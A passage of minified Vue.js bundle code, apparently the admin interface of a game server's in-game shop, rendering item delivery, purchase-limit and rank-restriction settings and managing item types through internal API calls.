e===t.add2EditItemForm.type}))},on:{change:function(){t.$refs.add2EditItemForm.clearValidate()}},model:{value:t.add2EditItemForm.configs.isTeleport,callback:function(e){t.$set(t.add2EditItemForm.configs,"isTeleport",e)},expression:"add2EditItemForm.configs.isTeleport"}})],2):t._e(),void 0===t.add2EditItemForm.configType||"dollar"!==t.add2EditItemForm.configType||t.add2EditItemForm.configs.isTeleport&&!1!==t.add2EditItemForm.configs.isTeleport?a("a-form-model-item",{attrs:{prop:"configs.noTeleportMode"}},[a("template",{slot:"label"},[a("span",[t._v("隔空刷货的格式")]),a("a-popover",{attrs:{placement:"left"}},[a("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[a("p",{staticStyle:{"font-weight":"bolder"}},[t._v('模式一: 【#spawnXXXX <商品> <数量> Location "<X坐标> <Y坐标> <Z坐标>"】 发货前获取坐标')]),a("p",{staticStyle:{"font-weight":"bolder"}},[t._v('模式二: 【#spawnXXXX <商品> <数量> Location "{X=<X坐标> Y=<Y坐标> Z=<Z坐标>|P=<俯仰角> Y=<侧航角> R=<翻滚角>}"】 发货前获取坐标')]),a("p",{staticStyle:{"font-weight":"bolder"}},[t._v("模式三: 【#spawnXXXX <商品> <数量> Location <Steam ID>】")])]),a("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),a("a-radio-group",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.isTeleportLimitType.find((function(e){return e===t.add2EditItemForm.type})),rlue:{required:!0===t.add2EditItemForm.configs.isTeleport,trigger:"change",message:"请选择隔空刷货的格式",validator:function(e,i,a){"boolean"==typeof i?a():a(new t.Error("请选择隔空刷货的格式"))}}},on:{change:function(){t.$refs.add2EditItemForm.clearValidate()}},model:{value:t.add2EditItemForm.configs.noTeleportMode,callback:function(e){t.$set(t.add2EditItemForm.configs,"noTeleportMode",e)},expression:"add2EditItemForm.configs.noTeleportMode"}},[a("a-radio",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.configTypeLimitType.find((function(e){return e===t.isTeleportLimitType.type})),value:"mode1"}},[t._v("模式一")]),a("a-radio",{attrs:{disabled:!0,value:"mode2"}},[t._v("模式二")]),a("a-radio",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.configTypeLimitType.find((function(e){return e===t.isTeleportLimitType.type})),value:"mode3"}},[t._v("模式三")])],1)],2):t._e(),a("a-form-model-item",{attrs:{prop:"configs.moneyToUser"}},[a("template",{slot:"label"},[a("span",[t._v("指定收款人")]),a("a-popover",{attrs:{placement:"left"}},[a("div",{staticStyle:{width:"500px"},attrs:{slot:"content"},slot:"content"},[a("p",{staticStyle:{"font-weight":"bolder"}},[t._v("如果填写此项，商品被购买时被指定收款人会获得货款")])]),a("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),a("a-select",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.moneyToUserLimitType.find((function(e){return e===t.add2EditItemForm.type})),placeholder:"模糊搜索(商城用户名或Steam ID)","allow-clear":"","show-search":"","filter-option":!1},on:{search:t.handleSearchSpecificReceiveDollarsUserName},model:{value:t.add2EditItemForm.configs.moneyToUser,callback:function(e){t.$set(t.add2EditItemForm.configs,"moneyToUser",e)},expression:"add2EditItemForm.configs.moneyToUser"}},t._l(t.searchMoneyToUserNameList,(function(e){return a("a-select-option",{key:e.id,attrs:{label:e.userName}},[t._v(t._s(e.userName))])})),1)],2),a("a-form-model-item",{staticStyle:{"margin-top":"10px"},attrs:{label:"禁用队伍购买",prop:"configs.noSquadBuy"}},[a("a-switch",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.noSquadBuyLimitType.find((function(e){return e===t.add2EditItemForm.type}))},on:{change:function(){t.$refs.add2EditItemForm.clearValidate()}},model:{value:t.add2EditItemForm.configs.noSquadBuy,callback:function(e){t.$set(t.add2EditItemForm.configs,"noSquadBuy",e)},expression:"add2EditItemForm.configs.noSquadBuy"}})],1),void 0===t.add2EditItemForm.configType||"dollar"!==t.add2EditItemForm.configType?a("a-form-model-item",{staticStyle:{"margin-top":"10px"},attrs:{label:"启用指定坐标发货",prop:"configs.enableDiyLocation"}},[a("a-switch",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.enableDiyLocationLimitType.find((function(e){return e===t.add2EditItemForm.type}))},on:{change:function(){t.$refs.add2EditItemForm.clearValidate()}},model:{value:t.add2EditItemForm.configs.enableDiyLocation,callback:function(e){t.$set(t.add2EditItemForm.configs,"enableDiyLocation",e)},expression:"add2EditItemForm.configs.enableDiyLocation"}})],1):t._e(),a("a-form-model-item",{attrs:{label:"自定义坐标",prop:"configs.diyLocation",rules:{required:t.add2EditItemForm.configs.enableDiyLocation,trigger:"change",message:"启用指定坐标发货时须符合坐标格式",validator:function(e,i,a){t.add2EditItemForm.configs.enableDiyLocation&&void 0!==i&&i.length>0||!t.add2EditItemForm.configs.enableDiyLocation?a():a(new t.Error("启用指定坐标发货时须符合坐标格式"))}}}},[a("a-input",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.diyLocationLimitType.find((function(e){return e===t.add2EditItemForm.type}))||!t.add2EditItemForm.configs.enableDiyLocation,allowClear:""},model:{value:t.add2EditItemForm.configs.diyLocation,callback:function(e){t.$set(t.add2EditItemForm.configs,"diyLocation",e)},expression:"add2EditItemForm.configs.diyLocation"}})],1),a("a-form-model-item",{staticStyle:{"margin-top":"10px"},attrs:{label:"不适用等级优惠",prop:"configs.noVipDiscount"}},[a("a-switch",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.noVipDiscountLimitType.find((function(e){return e===t.add2EditItemForm.type}))},on:{change:function(){t.$refs.add2EditItemForm.clearValidate()}},model:{value:t.add2EditItemForm.configs.noVipDiscount,callback:function(e){t.$set(t.add2EditItemForm.configs,"noVipDiscount",e)},expression:"add2EditItemForm.configs.noVipDiscount"}})],1),a("a-form-model-item",{attrs:{label:"购买限制配置"}},[a("div",{staticStyle:{width:"100%",height:"24px","margin-top":"10px"}},[a("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),a("div",{staticStyle:{width:"calc(100% - 10px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[a("span",[t._v("通用限制")])])]),a("div",{staticStyle:{width:"calc(100% - 10px)","min-width":"500px","margin-top":"5px","border-radius":"4px",border:"1px #aaaaaa dashed",padding:"10px"}},[a("a-form-model-item",{attrs:{label:"启用购买频率限制",prop:"configs.purchaseLimitOn","label-col":{span:7},"wrapper-col":{span:17}}},[a("a-switch",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.purchaseLimitOnLimitType.find((function(e){return e===t.add2EditItemForm.type}))},on:{change:function(){t.$refs.add2EditItemForm.clearValidate()}},model:{value:t.add2EditItemForm.configs.purchaseLimitOn,callback:function(e){t.$set(t.add2EditItemForm.configs,"purchaseLimitOn",e)},expression:"add2EditItemForm.configs.purchaseLimitOn"}})],1),a("a-form-model-item",{attrs:{label:"限制次数",prop:"configs.purchaseLimit.time","label-col":{span:7},"wrapper-col":{span:17},rules:{required:t.add2EditItemForm.configs.purchaseLimitOn,trigger:"change",message:"启用购买频率限制时须>0",validator:function(e,i,a){t.add2EditItemForm.configs.purchaseLimitOn&&"number"==typeof i&&i>0||!t.add2EditItemForm.configs.purchaseLimitOn?a():a(new t.Error("启用购买频率限制时须>0"))}}}},[a("a-input-number",{attrs:{min:0,allowClear:"",disabled:t.add2EditItemForm.type&&void 0!==t.purchaseLimitTimeLimitType.find((function(e){return e===t.add2EditItemForm.type}))||!t.add2EditItemForm.configs.purchaseLimitOn},model:{value:t.add2EditItemForm.configs.purchaseLimit.time,callback:function(e){t.$set(t.add2EditItemForm.configs.purchaseLimit,"time",e)},expression:"add2EditItemForm.configs.purchaseLimit.time"}})],1),a("a-form-model-item",{attrs:{label:"限制周期",prop:"configs.purchaseLimit.each","label-col":{span:7},"wrapper-col":{span:17},rules:{required:t.add2EditItemForm.configs.purchaseLimitOn,trigger:"change",message:"启用购买频率限制时不能为空",validator:function(e,i,a){t.add2EditItemForm.configs.purchaseLimitOn&&i&&i.length||!t.add2EditItemForm.configs.purchaseLimitOn?a():a(new t.Error("启用购买频率限制时不能为空"))}}}},[a("a-select",{staticStyle:{width:"250px"},attrs:{allowClear:"",disabled:t.add2EditItemForm.type&&void 0!==t.purchaseLimitEachLimitType.find((function(e){return e===t.add2EditItemForm.type}))||!t.add2EditItemForm.configs.purchaseLimitOn},model:{value:t.add2EditItemForm.configs.purchaseLimit.each,callback:function(e){t.$set(t.add2EditItemForm.configs.purchaseLimit,"each",e)},expression:"add2EditItemForm.configs.purchaseLimit.each"}},t._l(t.purchaseLimitEachKeyValue,(function(e,i){return a("a-select-option",{key:i,attrs:{title:e,disabled:t.add2EditItemForm.type&&void 0!==t.purchaseLimitEachLimitType.find((function(e){return e===t.add2EditItemForm.type}))}},[t._v(t._s(e))])})),1)],1),void 0===t.add2EditItemForm.configType||"dollar"!==t.add2EditItemForm.configType?a("a-form-model-item",{attrs:{label:"单用户总限制次数",prop:"configs.totalLimit","label-col":{span:7},"wrapper-col":{span:17}}},[a("a-input-number",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.totalLimitLimitType.find((function(e){return e===t.add2EditItemForm.type})),min:0,allowClear:""},model:{value:t.add2EditItemForm.configs.totalLimit,callback:function(e){t.$set(t.add2EditItemForm.configs,"totalLimit",e)},expression:"add2EditItemForm.configs.totalLimit"}})],1):t._e(),a("a-form-model-item",{attrs:{label:"特定用户允许购买",prop:"configs.specificUserLimit","label-col":{span:7},"wrapper-col":{span:17}}},[a("a-select",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.specificUserLimitLimitType.find((function(e){return e===t.add2EditItemForm.type})),placeholder:"模糊搜索(商城用户名或Steam ID)",mode:"multiple","allow-clear":"","show-search":"","filter-option":!1},on:{search:t.handleSearchSpecificUserName},model:{value:t.add2EditItemForm.configs.specificUserLimit,callback:function(e){t.$set(t.add2EditItemForm.configs,"specificUserLimit",e)},expression:"add2EditItemForm.configs.specificUserLimit"}},t._l(t.searchSpecificUserNameList,(function(e){return a("a-select-option",{key:e.id,attrs:{label:e.userName}},[t._v(t._s(e.userName))])})),1)],1)],1),a("div",{staticStyle:{width:"100%",height:"24px","margin-top":"10px"}},[a("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),a("div",{staticStyle:{width:"calc(100% - 10px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[a("span",[t._v("按等级限制")]),a("a-button",{staticStyle:{float:"right"},attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.levelLimitLimitType.find((function(e){return e===t.add2EditItemForm.type})),size:"small",type:"primary",icon:"plus"},on:{click:function(e){return t.add2EditItemForm.configs.levelPurchaseLimit.push({level:void 0,purchaseLimitOn:!1,purchaseLimit:{time:0,each:""},totalLimit:0})}}},[t._v("增加")])],1)]),t._l(t.add2EditItemForm.configs.levelPurchaseLimit,(function(e,i){return a("div",{key:i,staticStyle:{width:"calc(100% - 10px)","min-width":"500px","margin-top":"5px","border-radius":"4px",border:"1px #aaaaaa dashed",padding:"10px"}},[a("div",{staticStyle:{width:"100%",height:"24px"}},[a("a-button",{staticStyle:{float:"right"},attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.levelLimitLimitType.find((function(e){return e===t.add2EditItemForm.type})),size:"small",type:"danger",icon:"delete"},on:{click:function(e){return t.add2EditItemForm.configs.levelPurchaseLimit.splice(i,1)}}},[t._v("删除")])],1),a("a-form-model-item",{attrs:{label:"会员等级",prop:"configs.levelPurchaseLimit["+i+"].level","label-col":{span:7},"wrapper-col":{span:17},rules:{required:!0,trigger:"change",message:"请选择等级",validator:function(e,i,a){"number"==typeof i&&i>=0?a():a(new t.Error("请选择等级"))}}}},[a("a-select",{staticStyle:{width:"250px"},attrs:{allowClear:"",disabled:t.add2EditItemForm.type&&void 0!==t.levelLimitLimitType.find((function(e){return e===t.add2EditItemForm.type}))},model:{value:e.level,callback:function(i){t.$set(e,"level",i)},expression:"limit.level"}},t._l(t.levelList,(function(e){return a("a-select-option",{key:e.level,attrs:{title:e.level,disabled:t.add2EditItemForm.type&&void 0!==t.levelLimitLimitType.find((function(e){return e===t.add2EditItemForm.type}))}},[t._v(t._s(e.level))])})),1)],1),a("a-form-model-item",{attrs:{label:"启用购买频率限制",prop:"configs.levelPurchaseLimit["+i+"].purchaseLimitOn","label-col":{span:7},"wrapper-col":{span:17}}},[a("a-switch",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.purchaseLimitOnLimitType.find((function(e){return e===t.add2EditItemForm.type}))},on:{change:function(){t.$refs.add2EditItemForm.clearValidate()}},model:{value:e.purchaseLimitOn,callback:function(i){t.$set(e,"purchaseLimitOn",i)},expression:"limit.purchaseLimitOn"}})],1),a("a-form-model-item",{attrs:{label:"限制次数",prop:"configs.levelPurchaseLimit["+i+"].purchaseLimit.time","label-col":{span:7},"wrapper-col":{span:17},rules:{required:e.purchaseLimitOn,trigger:"change",message:"启用购买频率限制时须>0",validator:function(i,a,n){e.purchaseLimitOn&&"number"==typeof a&&a>0||!e.purchaseLimitOn?n():n(new t.Error("启用购买频率限制时须>0"))}}}},[a("a-input-number",{attrs:{min:0,allowClear:"",disabled:t.add2EditItemForm.type&&void 0!==t.purchaseLimitTimeLimitType.find((function(e){return e===t.add2EditItemForm.type}))||!e.purchaseLimitOn},model:{value:e.purchaseLimit.time,callback:function(i){t.$set(e.purchaseLimit,"time",i)},expression:"limit.purchaseLimit.time"}})],1),a("a-form-model-item",{attrs:{label:"限制周期",prop:"configs.levelPurchaseLimit["+i+"].purchaseLimit.each","label-col":{span:7},"wrapper-col":{span:17},rules:{required:e.purchaseLimitOn,trigger:"change",message:"启用购买频率限制时不能为空",validator:function(i,a,n){e.purchaseLimitOn&&a&&a.length||!e.purchaseLimitOn?n():n(new t.Error("启用购买频率限制时不能为空"))}}}},[a("a-select",{staticStyle:{width:"250px"},attrs:{allowClear:"",disabled:t.add2EditItemForm.type&&void 0!==t.purchaseLimitEachLimitType.find((function(e){return e===t.add2EditItemForm.type}))||!e.purchaseLimitOn},model:{value:e.purchaseLimit.each,callback:function(i){t.$set(e.purchaseLimit,"each",i)},expression:"limit.purchaseLimit.each"}},t._l(t.purchaseLimitEachKeyValue,(function(e,i){return a("a-select-option",{key:i,attrs:{title:e,disabled:t.add2EditItemForm.type&&void 0!==t.purchaseLimitEachLimitType.find((function(e){return e===t.add2EditItemForm.type}))}},[t._v(t._s(e))])})),1)],1),void 0===t.add2EditItemForm.configType||"dollar"!==t.add2EditItemForm.configType?a("a-form-model-item",{attrs:{label:"单用户总限制次数",prop:"configs.levelPurchaseLimit["+i+"].totalLimit","label-col":{span:7},"wrapper-col":{span:17}}},[a("a-input-number",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.totalLimitLimitType.find((function(e){return e===t.add2EditItemForm.type})),min:0,allowClear:""},model:{value:e.totalLimit,callback:function(i){t.$set(e,"totalLimit",i)},expression:"limit.totalLimit"}})],1):t._e()],1)}))],2),void 0===t.add2EditItemForm.configType||"dollar"!==t.add2EditItemForm.configType?a("a-form-model-item",{staticStyle:{"margin-top":"10px"},attrs:{label:"是否多次套餐",prop:"configs.multiple"}},[a("a-switch",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.multipleLimitType.find((function(e){return e===t.add2EditItemForm.type}))},on:{change:function(){t.$refs.add2EditItemForm.clearValidate()}},model:{value:t.add2EditItemForm.configs.multiple,callback:function(e){t.$set(t.add2EditItemForm.configs,"multiple",e)},expression:"add2EditItemForm.configs.multiple"}})],1):t._e(),a("a-form-model-item",{attrs:{label:"special-welcome-didi"===t.add2EditItemForm.type?"可领取次数":"包含次数",prop:"configs.multiTime",rules:{required:t.add2EditItemForm.configs.multiple,trigger:"change",message:"启用多次套餐时须>0",validator:function(e,i,a){t.add2EditItemForm.configs.multiple&&"number"==typeof i&&i>0||!t.add2EditItemForm.configs.multiple?a():a(new t.Error("启用多次套餐时须>0"))}}}},[a("a-input-number",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.multiTimeLimitType.find((function(e){return e===t.add2EditItemForm.type}))||!t.add2EditItemForm.configs.multiple,min:0,allowClear:""},model:{value:t.add2EditItemForm.configs.multiTime,callback:function(e){t.$set(t.add2EditItemForm.configs,"multiTime",e)},expression:"add2EditItemForm.configs.multiTime"}})],1),a("a-form-model-item",{attrs:{label:"会员等级限制",prop:"configs.levelLimit"}},[a("a-select",{staticStyle:{width:"100px"},attrs:{allowClear:"",disabled:t.add2EditItemForm.type&&void 0!==t.levelLimitTypeLimitType.find((function(e){return e===t.add2EditItemForm.type}))},model:{value:t.add2EditItemForm.configs.levelLimitType,callback:function(e){t.$set(t.add2EditItemForm.configs,"levelLimitType",e)},expression:"add2EditItemForm.configs.levelLimitType"}},[a("a-select-option",{key:">=",attrs:{title:"大于等于",disabled:t.add2EditItemForm.type&&void 0!==t.levelLimitTypeLimitType.find((function(e){return e===t.add2EditItemForm.type}))}},[t._v("大于等于")]),a("a-select-option",{key:"==",attrs:{title:"等于",disabled:t.add2EditItemForm.type&&void 0!==t.levelLimitTypeLimitType.find((function(e){return e===t.add2EditItemForm.type}))}},[t._v("等于")])],1),a("a-select",{staticStyle:{"margin-left":"10px",width:"250px"},attrs:{allowClear:"",disabled:t.add2EditItemForm.type&&void 0!==t.levelLimitLimitType.find((function(e){return e===t.add2EditItemForm.type}))},model:{value:t.add2EditItemForm.configs.levelLimit,callback:function(e){t.$set(t.add2EditItemForm.configs,"levelLimit",e)},expression:"add2EditItemForm.configs.levelLimit"}},t._l(t.levelList,(function(e){return a("a-select-option",{key:e.level,attrs:{title:e.level,disabled:t.add2EditItemForm.type&&void 0!==t.levelLimitLimitType.find((function(e){return e===t.add2EditItemForm.type}))}},[t._v(t._s(e.level))])})),1)],1),a("a-form-model-item",{attrs:{label:"军衔等级限制",prop:"configs.militaryLevelLimit"}},[a("a-select",{staticStyle:{"margin-left":"10px",width:"250px"},attrs:{allowClear:"",disabled:t.add2EditItemForm.type&&void 0!==t.militaryLevelLimitLimitType.find((function(e){return e===t.add2EditItemForm.type}))},model:{value:t.add2EditItemForm.configs.militaryLevelLimit,callback:function(e){t.$set(t.add2EditItemForm.configs,"militaryLevelLimit",e)},expression:"add2EditItemForm.configs.militaryLevelLimit"}},t._l(t.militaryLevelList,(function(e){return a("a-select-option",{key:e.levelId,attrs:{title:e.level,disabled:t.add2EditItemForm.type&&void 0!==t.militaryLevelLimitLimitType.find((function(e){return e===t.add2EditItemForm.type}))}},[t._v(t._s(e.level))])})),1)],1),a("a-form-model-item",{attrs:{label:"抢购商品数量限制",prop:"configs.buyLimit"}},[a("a-input-number",{attrs:{disabled:t.add2EditItemForm.type&&void 0!==t.buyLimitLimitType.find((function(e){return e===t.add2EditItemForm.type})),min:0,allowClear:""},model:{value:t.add2EditItemForm.configs.buyLimit,callback:function(e){t.$set(t.add2EditItemForm.configs,"buyLimit",e)},expression:"add2EditItemForm.configs.buyLimit"}})],1)],1):t._e()],2)],1)}),[],!1,null,"1a79239c",null),Me=Ne.exports,ze={name:"ItemTypeAdmin",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{Error:Error,cloneDeep:A.cloneDeep,loadingItemTypeListTable:!1,itemTypeListFilter:{name:void 0,cnName:void 0,canBeDeleted:void 0},itemTypeListColumns:[{title:"商品种类(ID)",key:"name",dataIndex:"name",width:180,align:"center",scopedSlots:{customRender:"name"}},{title:"商品种类(中文)",key:"cnName",dataIndex:"cnName",width:180,align:"center",scopedSlots:{customRender:"cnName"}},{title:"父级商品种类",key:"fatherItemTypeId",dataIndex:"fatherItemTypeId",width:180,align:"center",scopedSlots:{customRender:"fatherItemTypeId"}},{title:"操作",key:"controls",dataIndex:"controls",width:180,align:"center",scopedSlots:{customRender:"controls"}}],allowFatherListData:[],itemTypeListData:[],itemTypeListPagination:{pageSize:20,pageNum:1,total:0},showAdd2EditItemTypeModal:!1,add2EditItemModalType:"add",add2EditItemTypeForm:{id:-1,name:"",cnName:"",fatherItemTypeId:"",canBeDeleted:!0},add2EditItemTypeLoading:!1,add2EditItemTypeRules:{name:[{required:!0,trigger:"change",message:'不能为空或以"special-" / "null"开头或与现有的重复',validator:function(e,t,i){t&&t.length&&!t.startsWith("special-")&&!t.startsWith("null")?i():i(new Error('不能为空或以"special-"/ "null"开头或与现有的重复'))}}],cnName:[{required:!0,trigger:"change",message:"不能为空",validator:function(e,t,i){t&&t.length?i():i(new Error("不能为空"))}}],canBeDeleted:[{required:!0,trigger:"change",message:"不能为空",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("不能为空"))}}]},exportLoading:!1,showImportItemTypesItemModal:!1,importItemTypesLoading:!1,importItemTypesType:"own",importItemTypesTxt:!1,selectedRowKeys:[]}},mounted:function(){this.$route.query.cnName&&(this.itemTypeListFilter.cnName=this.$route.query.cnName),this.getItemTypeList(),this.getAllowFatherList()},methods:{onItemTypeListCleanFilter:function(){var e=this;Object.keys(this.$route.query).length>1&&this.$router.push({path:"/items",query:{category:"item-type"}}),this.itemTypeListPagination.pageNum=1,this.$nextTick((function(){e.getItemTypeList(!0)}))},onItemTypeListFilter:function(){var e=this;Object.keys(this.$route.query).length>1&&this.$router.push({path:"/items",query:{category:"item-type"}}),this.itemTypeListPagination.pageNum=1,this.$nextTick((function(){e.getItemTypeList()}))},onChangeItemTypeListPagination:function(e){var t=this;this.itemTypeListPagination.pageNum=e,this.$nextTick((function(){t.getItemTypeList()}))},onShowSizeChangeItemTypeListPagination:function(e,t){var i=this;this.itemTypeListPagination.pageNum=1,this.itemTypeListPagination.pageSize=t,this.$nextTick((function(){i.getItemTypeList()}))},getAllowFatherList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/itemTypesAdminSys/listAllowFather"});case 3:200===(i=t.sent).status&&(e.allowFatherListData=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},getItemTypeList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.itemTypeListPagination,n=a.pageNum,r=a.pageSize,e?(t.itemTypeListFilter={name:void 0,cnName:void 0,canBeDeleted:void 0},o={pageNum:n,pageSize:r}):((l=Object(A.cloneDeep)(t.itemTypeListFilter)).canBeDeleted="true"===l.canBeDeleted||"false"!==l.canBeDeleted&&void 0,o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingItemTypeListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/itemTypesAdminSys/list",params:o});case 6:c=i.sent,t.loadingItemTypeListTable=!1,200===c.status&&(t.itemTypeListPagination.total=c.data.count,t.itemTypeListData=c.data.list,t.selectedRowKeys=[]),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingItemTypeListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},deleteItemType:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/itemTypesAdminSys/delete",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getItemTypeList(),t.getAllowFatherList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},deleteItemTypes:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,t.next=4,f({method:"DELETE",url:"/itemTypesAdminSys/deleteItemsTypes",data:i});case 4:200===(a=t.sent).status&&(null!=a&&null!==(n=a.data)&&void 0!==n&&null!==(r=n.failIds)&&void 0!==r&&r.length?e.$message.warning("成功".concat(null==a||null===(o=a.data)||void 0===o?void 0:o.success,"个，以下ID删除出错: ").concat(null==a||null===(s=a.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getItemTypeList(),e.getAllowFatherList()),t.next=11;break;case 8:t.prev=8,t.t0=t.catch(1),console.error(t.t0);case 11:case"end":return t.stop()}}),t,null,[[1,8]])})))()},topItemType:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,a={id:e,topTimeStamp:Date.now()},i.next=4,f({method:"PUT",url:"/itemTypesAdminSys/update",data:a});case 4:200===(n=i.sent).status?(t.$message.success("置顶成功"),t.getItemTypeList(),t.getAllowFatherList()):(console.log("错误",n),t.$message.error(n.msg)),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(0),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[0,8]])})))()},submitAdd2EditItemType:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.add2EditItemTypeForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=16;break}return a={name:e.add2EditItemTypeForm.name,cnName:e.add2EditItemTypeForm.cnName,fatherItemTypeId:e.add2EditItemTypeForm.fatherItemTypeId,canBeDeleted:e.add2EditItemTypeForm.canBeDeleted},-1!==e.add2EditItemTypeForm.id&&(a.id=e.add2EditItemTypeForm.id),e.add2EditItemTypeLoading=!0,t.prev=4,t.next=7,f({method:"add"===e.add2EditItemModalType?"POST":"PUT",url:"add"===e.add2EditItemModalType?"/itemTypesAdminSys/add":"/itemTypesAdminSys/update",data:a});case 7:n=t.sent,e.add2EditItemTypeLoading=!1,200===n.status?(e.$message.success("".concat("add"===e.add2EditItemModalType?"新增":"编辑","添加成功")),e.add2EditItemModalType="add",e.showAdd2EditItemTypeModal=!1,e.add2EditItemTypeLoading=!1,e.add2EditItemTypeForm={id:-1,name:"",cnName:"",fatherItemTypeId:"",canBeDeleted:!0},e.getItemTypeList(),e.getAllowFatherList()):(console.log("错误",n),e.$message.error(n.msg)),t.next=16;break;case 12:t.prev=12,t.t0=t.catch(4),console.error(t.t0),e.add2EditItemTypeLoading=!1;case 16:case"end":return t.stop()}}),t,null,[[4,12]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},clickExportItemTypesList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.exportLoading=!0,t.next=4,f({method:"GET",url:"/itemTypesAdminSys/export"});case 4:200===(i=t.sent).status&&(a=JSON.stringify({data:i.data}),(n=document.createElement("a")).setAttribute("href","data:text/plain;charset=utf-8,"+encodeURIComponent(a)),n.setAttribute("download","itemTypes.log"),n.style.display="none",document.body.appendChild(n),n.click(),document.body.removeChild(n),e.exportLoading=!1,e.$message.success("导出成功")),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.exportLoading=!1,e.$message.error("下载出错："+t.t0.toString());case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()},submitImportItemTypes:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(e.importItemTypesLoading=!0,t.prev=1,i=JSON.parse(e.importItemTypesTxt),"own"===e.importItemTypesType&&i.data&&void 0===i.data.find((function(e){return!(e.name&&e.cnName&&"boolean"==typeof e.canBeDeleted)}))||"yingzi"===e.importItemTypesType&&i.rows&&void 0===i.rows.find((function(e){return!("number"==typeof e.id&&e.name)}))){t.next=7;break}return e.importItemTypesLoading=!1,e.$message.error("导入格式不正确"),t.abrupt("return");case 7:return t.prev=7,t.next=10,f({method:"POST",url:"/itemTypesAdminSys/import",data:{type:e.importItemTypesType,data:"own"===e.importItemTypesType?i.data:"yingzi"===e.importItemTypesType?i.rows:null}});case 10:a=t.sent,e.importItemTypesLoading=!1,200===a.status?(e.showImportItemTypesItemModal=!1,e.importItemTypesLoading=!1,n=a.data,r=n.success,o=n.fail,e.$message.success("已执行导入，成功".concat(r,"条，失败").concat(o,"条")),e.getItemTypeList(),e.getAllowFatherList()):(console.log("错误",a),e.$message.error(a.msg)),t.next=19;break;case 15:t.prev=15,t.t0=t.catch(7),e.importItemTypesLoading=!1,e.$message.error(t.t0);case 19:t.next=25;break;case 21:t.prev=21,t.t1=t.catch(1),e.importItemTypesLoading=!1,e.$message.error("导入格式不正确");case 25:case"end":return t.stop()}}),t,null,[[1,21],[7,15]])})))()}}},Oe=ze,qe=Object(S.a)(Oe,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return 